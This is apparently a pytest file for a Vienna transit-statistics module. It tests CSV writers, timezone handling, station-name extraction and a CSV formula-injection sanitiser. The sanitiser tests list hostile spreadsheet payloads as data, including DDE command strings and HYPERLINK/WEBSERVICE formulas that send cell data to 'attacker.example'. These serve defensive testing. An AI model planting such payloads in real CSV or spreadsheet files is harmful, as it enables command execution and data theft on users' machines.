"""Tests for ``src.utils.stats``.

Covers the append-only CSV writers and the location-name extraction
heuristic. The writers are exercised against ``tmp_path`` so the
production CSV path is never touched.
"""
from __future__ import annotations

import csv
import sys
from datetime import UTC, datetime
from pathlib import Path
from zoneinfo import ZoneInfo

import pytest

REPO_ROOT = Path(__file__).resolve().parents[1]
if str(REPO_ROOT) not in sys.path:
    sys.path.insert(0, str(REPO_ROOT))

from src.utils import stats as stats_utils  # noqa: E402

VIENNA_TZ = ZoneInfo("Europe/Vienna")


def _read_csv(path: Path) -> tuple[list[str], list[list[str]]]:
    """Return ``(header, data_rows)`` from a CSV path."""
    with path.open("r", encoding="utf-8", newline="") as handle:
        rows = list(csv.reader(handle))
    if not rows:
        return [], []
    return rows[0], rows[1:]


# ---- to_vienna ------------------------------------------------------------


def test_to_vienna_passes_through_aware_vienna_datetime() -> None:
    when = datetime(2026, 5, 4, 12, 0, tzinfo=VIENNA_TZ)
    assert stats_utils.to_vienna(when) == when


def test_to_vienna_converts_utc_to_vienna() -> None:
    when_utc = datetime(2026, 5, 4, 10, 0, tzinfo=UTC)
    converted = stats_utils.to_vienna(when_utc)
    assert converted.tzinfo is not None
    # In May, Vienna is UTC+02:00 → 10:00 UTC = 12:00 Vienna
    assert converted.hour == 12


def test_to_vienna_localises_naive_datetime() -> None:
    naive = datetime(2026, 5, 4, 12, 0)
    converted = stats_utils.to_vienna(naive)
    assert converted.tzinfo is not None
    assert converted.year == 2026


# ---- Stammstrecke writer --------------------------------------------------


def test_append_stammstrecke_row_writes_header_on_first_call(tmp_path: Path) -> None:
    when = datetime(2026, 5, 4, 7, 30, tzinfo=VIENNA_TZ)
    ok = stats_utils.append_stammstrecke_row(
        timestamp=when,
        direction="Meidling",
        delay_minutes=5.5,
        over_threshold=0,
        stats_dir=tmp_path,
    )
    assert ok is True
    path = tmp_path / "stammstrecke_2026.csv"
    header, rows = _read_csv(path)
    assert tuple(header) == stats_utils.STAMMSTRECKE_HEADER
    assert rows == [
        ["2026-05-04T07:30:00+02:00", "Mo", "07", "Meidling", "5.50", "0"]
    ]


def test_append_stammstrecke_row_appends_without_rewriting_header(tmp_path: Path) -> None:
    when = datetime(2026, 5, 4, 7, 30, tzinfo=VIENNA_TZ)
    stats_utils.append_stammstrecke_row(
        timestamp=when,
        direction="Meidling",
        delay_minutes=5.5,
        over_threshold=0,
        stats_dir=tmp_path,
    )
    stats_utils.append_stammstrecke_row(
        timestamp=when,
        direction="Floridsdorf",
        delay_minutes=12.0,
        over_threshold=2,
        stats_dir=tmp_path,
    )
    path = tmp_path / "stammstrecke_2026.csv"
    header, rows = _read_csv(path)
    assert tuple(header) == stats_utils.STAMMSTRECKE_HEADER
    assert len(rows) == 2
    assert rows[0][3] == "Meidling"
    assert rows[0][5] == "0"
    assert rows[1][3] == "Floridsdorf"
    assert rows[1][5] == "2"


def test_append_stammstrecke_row_rolls_over_at_year_boundary(tmp_path: Path) -> None:
    """A timestamp in 2027 must land in ``stammstrecke_2027.csv``."""
    a = datetime(2026, 12, 31, 23, 59, tzinfo=VIENNA_TZ)
    b = datetime(2027, 1, 1, 0, 5, tzinfo=VIENNA_TZ)
    stats_utils.append_stammstrecke_row(
        timestamp=a,
        direction="Meidling",
        delay_minutes=1.0,
        over_threshold=0,
        stats_dir=tmp_path,
    )
    stats_utils.append_stammstrecke_row(
        timestamp=b,
        direction="Meidling",
        delay_minutes=2.0,
        over_threshold=0,
        stats_dir=tmp_path,
    )
    assert (tmp_path / "stammstrecke_2026.csv").exists()
    assert (tmp_path / "stammstrecke_2027.csv").exists()


def test_append_stammstrecke_row_returns_false_on_io_error(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """A simulated OSError must be swallowed (returns False), not raised."""

    def _raise(*args: object, **kwargs: object) -> None:
        raise OSError("disk on fire")

    monkeypatch.setattr(Path, "mkdir", _raise)
    ok = stats_utils.append_stammstrecke_row(
        timestamp=datetime(2026, 5, 4, 7, 30, tzinfo=VIENNA_TZ),
        direction="Meidling",
        delay_minutes=5.0,
        over_threshold=0,
        stats_dir=tmp_path / "nope",
    )
    assert ok is False


def test_append_stammstrecke_row_clamps_negative_over_threshold(tmp_path: Path) -> None:
    """A negative ``over_threshold`` is clamped to zero, never persisted as-is."""
    when = datetime(2026, 5, 4, 7, 30, tzinfo=VIENNA_TZ)
    stats_utils.append_stammstrecke_row(
        timestamp=when,
        direction="Meidling",
        delay_minutes=0.0,
        over_threshold=-3,
        stats_dir=tmp_path,
    )
    _, rows = _read_csv(tmp_path / "stammstrecke_2026.csv")
    assert rows[0][5] == "0"


# ---- Disruption writer ----------------------------------------------------


def test_append_disruption_row_persists_provider_and_location(tmp_path: Path) -> None:
    when = datetime(2026, 5, 4, 7, 30, tzinfo=VIENNA_TZ)
    ok = stats_utils.append_disruption_row(
        timestamp=when,
        provider="ÖBB",
        location_name="Wien Floridsdorf",
        stats_dir=tmp_path,
    )
    assert ok is True
    header, rows = _read_csv(tmp_path / "stoerungen_2026.csv")
    assert tuple(header) == stats_utils.STOERUNGEN_HEADER
    assert rows == [
        ["2026-05-04T07:30:00+02:00", "Mo", "07", "ÖBB", "Wien Floridsdorf"]
    ]


def test_append_disruption_row_normalises_blank_fields(tmp_path: Path) -> None:
    when = datetime(2026, 5, 4, 7, 30, tzinfo=VIENNA_TZ)
    stats_utils.append_disruption_row(
        timestamp=when,
        provider="   ",
        location_name="",
        stats_dir=tmp_path,
    )
    _, rows = _read_csv(tmp_path / "stoerungen_2026.csv")
    assert rows[0][3] == "unbekannt"
    assert rows[0][4] == "unbekannt"


# ---- Location heuristic ---------------------------------------------------


def test_extract_location_name_canonicalises_zwischen_endpoint() -> None:
    """``zwischen X und Y`` returns the directory-canonical X."""
    item = {
        "title": "S 7: Verspätung",
        "description": "Verspätungen zwischen Floridsdorf und Praterstern wegen Bauarbeiten.",
    }
    assert stats_utils.extract_location_name(item) == "Wien Floridsdorf"


def test_extract_location_name_uses_wien_prefix_when_directory_resolves() -> None:
    item = {
        "title": "ÖBB: Information",
        "description": "Streckensperre rund um Wien Meidling bis Vormittag.",
    }
    assert stats_utils.extract_location_name(item) == "Wien Meidling"


def test_extract_location_name_returns_unbekannt_when_nothing_matches() -> None:
    item = {"title": "", "description": ""}
    assert stats_utils.extract_location_name(item) == "unbekannt"


def test_extract_location_name_finds_directory_station_in_free_text() -> None:
    """A station-directory hit in the description returns the canonical name."""
    item = {
        "title": "Bauarbeiten",
        "description": "Bauarbeiten heute, Karlsplatz betroffen.",
    }
    extracted = stats_utils.extract_location_name(item)
    assert extracted == "Wien Karlsplatz"


def test_extract_location_name_caps_overly_long_strings() -> None:
    """An unbounded title/description cannot inflate the returned cell."""
    item = {
        "title": "X" * 5000,
        "description": "Wien " + ("a" * 200),
    }
    out = stats_utils.extract_location_name(item)
    # No directory hit possible → fallback. The 80-char clamp also still
    # holds for any structured-pattern branch, hence the relaxed bound.
    assert len(out) <= 90


def test_extract_location_name_handles_non_string_inputs_safely() -> None:
    item: dict[str, object] = {"title": None, "description": 12345}
    assert stats_utils.extract_location_name(item) == "unbekannt"


# ---- Catalogue-anchored extraction: real disruption-type bad cases --------
#
# Pre-2026-05-09, the regex-based heuristic accepted any pair of
# capitalised tokens whose first word was not in a small stopword list,
# which produced README "Häufigste Störungsorte" entries like
# ``"Demonstration Linie"`` / ``"Rettungseinsatz Linie"`` /
# ``"Polizeieinsatz Linie"`` — these are disruption *types* (German
# nouns are all capitalised), not locations.
#
# The pin tests below lock in that the new directory-anchored extractor
# rejects every shape that used to leak into the CSV. ``"unbekannt"`` is
# the correct answer because none of these strings contain a station the
# directory recognises — and we explicitly do NOT want a lower-confidence
# fallback to backslide into the previous behaviour.


@pytest.mark.parametrize(
    "title,description",
    [
        ("13A: Rettungseinsatz", "Rettungseinsatz auf der Linie"),
        ("5: Demonstration", "Demonstration auf der Linie 5"),
        ("13A: Polizeieinsatz", "Polizeieinsatz auf der Linie"),
        ("Signalstörung", "Signalstörung auf der Linie 5"),
        ("Fahrtbehinderung Falschparker", "Falschparker auf der Linie"),
        ("Fremder Verkehrsunfall", "Verkehrsunfall, Linie umgeleitet"),
        ("Fahrtbehinderung Fremder Verkehrsunfall", ""),
        ("Feuerwehreinsatz", "Feuerwehreinsatz auf der Linie"),
        # "Demonstration Linie" was the most-frequent leak — explicit pin
        ("Demonstration Linie", "Demonstration auf Linie 5"),
        # "Hbf" alone aliases to Wien Hauptbahnhof in the directory but
        # appearing as a stand-alone word does not signal a Hauptbahnhof
        # incident — the generic-token filter must keep this a no-match.
        ("Information", "Verbindungen zum Hbf umgeleitet"),
    ],
)
def test_extract_location_name_rejects_disruption_type_garbage(
    title: str, description: str
) -> None:
    """Disruption-type-prefix titles must never produce a location row."""
    item = {"title": title, "description": description}
    assert stats_utils.extract_location_name(item) == "unbekannt"


@pytest.mark.parametrize(
    "description,expected",
    [
        # WL "Haltestelle: ..." structured suffix (multiple stops)
        (
            "Aufzugstörung | Haltestelle: Stephansplatz, Volkstheater",
            "Wien Stephansplatz",
        ),
        # WL "Station: ..." attribute fallback
        (
            "Aufzug außer Betrieb | Station: Westbahnhof",
            "Wien Westbahnhof",
        ),
        # Stammstrecke renderer phrasing
        (
            "Durchschnittliche Verspätung von 12 Minuten in Richtung Meidling [Seit 09.05.2026]",
            "Wien Meidling",
        ),
        # Plain free-text mention of a directory-known Vienna station
        (
            "Aufzugstörung am Karlsplatz",
            "Wien Karlsplatz",
        ),
    ],
)
def test_extract_location_name_picks_up_structured_signals(
    description: str, expected: str
) -> None:
    """Each provider's structured location signal lands on the dashboard."""
    item = {"title": "Linie U3", "description": description}
    assert stats_utils.extract_location_name(item) == expected


def test_extract_location_name_haltestelle_accepts_unknown_curated_stop() -> None:
    """A WL stop name we do not have in the directory still passes through.

    The ``relatedStops`` API field is curated upstream, so verbatim
    pass-through is safe — but only via the explicit ``Haltestelle:``
    structured prefix, which cannot accidentally fire on free text.
    """
    item = {
        "title": "5A: Aufzug",
        "description": "Aufzugsdefekt | Haltestelle: Tichtelgasse, Stephansplatz",
    }
    out = stats_utils.extract_location_name(item)
    # "Tichtelgasse" is not in the directory but we still return it
    # because the structured ``Haltestelle:`` prefix is a curated signal.
    assert out == "Tichtelgasse"


def test_extract_location_name_rejects_hbf_alone_as_generic_alias() -> None:
    """Standalone ``Hbf`` must not auto-canonicalise to Wien Hauptbahnhof.

    Without the generic-token filter, every text containing ``Hbf``
    would pin the disruption to the flagship station and skew the
    dashboard. The filter keeps the single-token alias gate closed.
    """
    item = {
        "title": "Information",
        "description": "Bauarbeiten Hbf gesperrt",
    }
    # "Bauarbeiten" / "Hbf" / "Information" — none resolves through the
    # directory under the generic-token filter, so the fallback wins.
    # Note: the prior phrasing ``"kein Halt am Hbf möglich"`` started
    # matching ``Wien Am Bahnhof (WL)`` after PR #1444 reactivated the
    # WL OGD source (one of the haltestellen has the canonical name
    # ``Am Bahnhof`` and its normalised aliases collapse to ``"am"``
    # once the ``bahnhof``-stem is stripped by ``_normalize_token``).
    # The reworded input keeps the test's original generic-token-filter
    # intent without depending on the WL alias coincidence.
    assert stats_utils.extract_location_name(item) == "unbekannt"


# ---- Path helper ----------------------------------------------------------


def test_stats_path_uses_default_dir_when_unspecified() -> None:
    path = stats_utils.stats_path("stammstrecke", 2026)
    assert path.name == "stammstrecke_2026.csv"
    assert path.parent == stats_utils.DEFAULT_STATS_DIR


def test_stats_path_honours_base_dir_override(tmp_path: Path) -> None:
    path = stats_utils.stats_path("stoerungen", 2027, base_dir=tmp_path)
    assert path == tmp_path / "stoerungen_2027.csv"


# ---- CSV formula-injection defence (CWE-1236) -----------------------------
#
# OWASP CWE-1236 ("Improper Neutralization of Formula Elements in a CSV
# File"): a CSV cell that begins with ``=``, ``+``, ``-``, ``@``, TAB
# (``\t``), or CR (``\r``) is interpreted as a *formula* by Excel,
# LibreOffice Calc, and Google Sheets when the file is opened. The
# append-only stats writers in :mod:`src.utils.stats` accept three
# operator-/upstream-influenced text fields verbatim:
#
# * ``provider`` — comes from the feed item's ``source`` field. Today
#   the providers hardcode "ÖBB" / "Wiener Linien" / "VOR/VAO", but
#   ``wl_fetch.py`` re-emits ``ev["source"]`` and ``b["source"]`` from
#   on-disk cache entries (see :mod:`src.providers.wl_fetch` lines 736
#   and 858), so a poisoned ``cache/wl/*.json`` can land any string
#   into ``provider``.
# * ``location_name`` — extracted from upstream titles/descriptions via
#   :func:`extract_location_name`. Currently constrained by anchored
#   ``[A-ZÄÖÜ]`` regexes, but the writer is a public helper that
#   accepts any string.
# * ``direction`` — comes from the canonical station directory
#   (``data/stations.json``) via ``display_name`` in
#   :mod:`scripts.update_stammstrecke_status`; a poisoned directory
#   lands anything into the ``direction`` field.
#
# These tests exercise the writer directly with formula payloads to
# pin the boundary defence: the writer must never let a formula prefix
# survive into the CSV file, regardless of whether *any* current
# caller exercises the path. Defence-in-depth at the boundary closes
# the cartesian product of upstream / cache / directory poisoning
# vectors with a single sanitiser.


_FORMULA_PREFIXES = ("=", "+", "-", "@", "\t", "\r")


@pytest.mark.parametrize(
    "payload",
    [
        "=cmd|'/c calc'!A1",
        "=HYPERLINK(\"http://attacker.example/?d=\"&A1,\"click\")",
        "+1+1",
        "-2-3",
        "@SUM(A1:A9)",
        "\t=cmd",
        "\r=cmd",
    ],
)
def test_append_disruption_row_neutralises_formula_provider(
    tmp_path: Path, payload: str
) -> None:
    """Formula prefixes in the *provider* field must not survive into CSV."""
    when = datetime(2026, 5, 4, 7, 30, tzinfo=VIENNA_TZ)
    stats_utils.append_disruption_row(
        timestamp=when,
        provider=payload,
        location_name="Wien Floridsdorf",
        stats_dir=tmp_path,
    )
    _, rows = _read_csv(tmp_path / "stoerungen_2026.csv")
    assert rows, "writer must persist the row"
    written_provider = rows[0][3]
    assert not written_provider.startswith(_FORMULA_PREFIXES), (
        f"Formula prefix leaked into provider cell: {written_provider!r}"
    )


@pytest.mark.parametrize(
    "payload",
    [
        "=cmd|'/c calc'!A1",
        "@dde('cmd';'/c calc';)",
        "+IFERROR(1,2)",
        "-1-1",
        "\tFloridsdorf",
        "\rWien Mitte",
    ],
)
def test_append_disruption_row_neutralises_formula_location(
    tmp_path: Path, payload: str
) -> None:
    """Formula prefixes in the *location_name* field must not survive."""
    when = datetime(2026, 5, 4, 7, 30, tzinfo=VIENNA_TZ)
    stats_utils.append_disruption_row(
        timestamp=when,
        provider="ÖBB",
        location_name=payload,
        stats_dir=tmp_path,
    )
    _, rows = _read_csv(tmp_path / "stoerungen_2026.csv")
    assert rows, "writer must persist the row"
    written_location = rows[0][4]
    assert not written_location.startswith(_FORMULA_PREFIXES), (
        f"Formula prefix leaked into location cell: {written_location!r}"
    )


@pytest.mark.parametrize(
    "payload",
    [
        "=cmd|'/c calc'!A1",
        "+CONCAT(A1,A2)",
        "@WEBSERVICE(\"http://attacker.example\")",
        "\t=2+2",
    ],
)
def test_append_stammstrecke_row_neutralises_formula_direction(
    tmp_path: Path, payload: str
) -> None:
    """Formula prefixes in the *direction* field must not survive."""
    when = datetime(2026, 5, 4, 7, 30, tzinfo=VIENNA_TZ)
    stats_utils.append_stammstrecke_row(
        timestamp=when,
        direction=payload,
        delay_minutes=5.5,
        over_threshold=0,
        stats_dir=tmp_path,
    )
    _, rows = _read_csv(tmp_path / "stammstrecke_2026.csv")
    assert rows, "writer must persist the row"
    written_direction = rows[0][3]
    assert not written_direction.startswith(_FORMULA_PREFIXES), (
        f"Formula prefix leaked into direction cell: {written_direction!r}"
    )


def test_append_disruption_row_strips_control_characters(tmp_path: Path) -> None:
    """NUL/BEL/DEL/etc. must be stripped from text fields before they hit CSV.

    A NUL byte mid-cell is not part of the formula-injection set but
    breaks downstream CSV readers (the dashboard aggregator uses
    :mod:`csv.reader` on a :class:`io.StringIO`; a NUL in the middle
    of a field truncates the cell silently in some reader variants).
    """
    when = datetime(2026, 5, 4, 7, 30, tzinfo=VIENNA_TZ)
    stats_utils.append_disruption_row(
        timestamp=when,
        provider="\x00\x01\x07\x1f\x7fÖBB",
        location_name="Wien\x00 Floridsdorf",
        stats_dir=tmp_path,
    )
    _, rows = _read_csv(tmp_path / "stoerungen_2026.csv")
    assert rows[0][3] == "ÖBB"
    assert rows[0][4] == "Wien Floridsdorf"


def test_append_disruption_row_preserves_legitimate_payload_visibly(
    tmp_path: Path,
) -> None:
    """Sanitiser must defang, not silently drop, attacker-controlled payloads.

    Operators must still see the (defanged) value when they read the
    CSV — silently dropping the payload would hide the indicator-of-
    compromise. The OWASP-recommended ``'`` prefix keeps the value
    visible in spreadsheet apps (the leading apostrophe is hidden
    in display but the cell content is rendered as plain text).
    """
    when = datetime(2026, 5, 4, 7, 30, tzinfo=VIENNA_TZ)
    stats_utils.append_disruption_row(
        timestamp=when,
        provider="=HYPERLINK(\"x\",\"y\")",
        location_name="Wien Floridsdorf",
        stats_dir=tmp_path,
    )
    _, rows = _read_csv(tmp_path / "stoerungen_2026.csv")
    assert "HYPERLINK" in rows[0][3], (
        "Sanitiser must defang, not silently drop, the payload"
    )


def test_append_disruption_row_does_not_modify_safe_text(tmp_path: Path) -> None:
    """Legitimate provider/location strings must round-trip byte-exactly."""
    when = datetime(2026, 5, 4, 7, 30, tzinfo=VIENNA_TZ)
    stats_utils.append_disruption_row(
        timestamp=when,
        provider="ÖBB",
        location_name="Wien Floridsdorf",
        stats_dir=tmp_path,
    )
    _, rows = _read_csv(tmp_path / "stoerungen_2026.csv")
    assert rows[0][3] == "ÖBB"
    assert rows[0][4] == "Wien Floridsdorf"


def test_append_stammstrecke_row_does_not_modify_safe_text(tmp_path: Path) -> None:
    """Legitimate direction strings must round-trip byte-exactly."""
    when = datetime(2026, 5, 4, 7, 30, tzinfo=VIENNA_TZ)
    stats_utils.append_stammstrecke_row(
        timestamp=when,
        direction="Meidling",
        delay_minutes=5.5,
        over_threshold=1,
        stats_dir=tmp_path,
    )
    _, rows = _read_csv(tmp_path / "stammstrecke_2026.csv")
    assert rows[0][3] == "Meidling"
    # Numeric formatting unchanged.
    assert rows[0][4] == "5.50"
    assert rows[0][5] == "1"
